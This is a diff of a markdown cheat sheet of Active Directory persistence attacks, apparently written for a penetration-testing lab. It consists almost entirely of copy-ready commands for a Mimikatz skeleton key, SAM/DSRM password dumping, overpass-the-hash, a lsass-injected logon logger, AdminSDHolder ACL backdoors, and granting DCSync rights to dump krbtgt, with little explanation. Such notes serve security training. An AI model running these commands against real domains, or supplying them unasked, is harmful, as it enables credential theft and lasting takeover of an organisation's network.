@@ -94,14 +94,16 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
 
 #### Create the skeleton key - Requires DA
 ```
-Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
+Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <TARGET>
 ```
+
+### Authenticate as any user with password ```mimikatz```
 
 ## DSRM
 #### Dump DSRM password - dumps local users
-look for the local administrator password
+- look for the local administrator password
 ```
-Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
+Invoke-Mimikatz -Command '"token::elevate” “lsadump::sam"' -Computername <TARGET>
 ```
 
 #### Change login behavior for the local admin on the DC
@@ -109,19 +111,19 @@ Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computer
 New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
 ```
 
-#### If property already exists
+#### Overpass the hash local administrator
 ```
-Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC NAME> /user:Administrator /ntlm:<HASH> /run:powershell.exe"' 
 ```
 
-#### Pass the hash for local admin
+#### Use PSremoting with NTLM authentication
 ```
-Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
+Enter-PSSession -ComputerName <COMPUTERNAME> -Authentication Negotiate 
 ```
 
 ## Custom SSP - Track logons
 #### Mimilib.dll
-Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
+- Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
 ```
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
 $packages += "mimilib"
@@ -132,7 +134,7 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pac
 #### Use mimikatz to inject into lsass
 all logons are logged to C:\Windows\System32\kiwissp.log
 ```
-Invoke-Mimikatz -Command ‘”misc:memssp”’
+Invoke-Mimikatz -Command '"misc:memssp"'
 ```
 
 ## ACL
@@ -146,7 +148,14 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 #### Add fullcontrol permissions for a user to the adminSDHolder
 ```
-Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
+```
+
+#### Other interesting permissions
+```
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights ResetPassword -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights WriteMembers -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
 ```
 
 #### Run SDProp on AD (Force the sync of AdminSDHolder)
@@ -181,14 +190,14 @@ Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureSt
 ### DCsync
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
 
-#### Add full-control rights
+#### Add Full-control rights
 ```
-Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN< -TargetDomain <DOMAIN> -Verbose
 ```
 
 #### Add rights for DCsync
 ```
-Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
+Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose 
 ```
 
 #### Execute DCSync and dump krbtgt
@@ -212,7 +221,7 @@ Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘ro
 ```
 
 #### On a remote machine with explicit credentials
-Only root/cimv and nested namespaces
+- Only root/cimv and nested namespaces
 ```
 Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
 ```
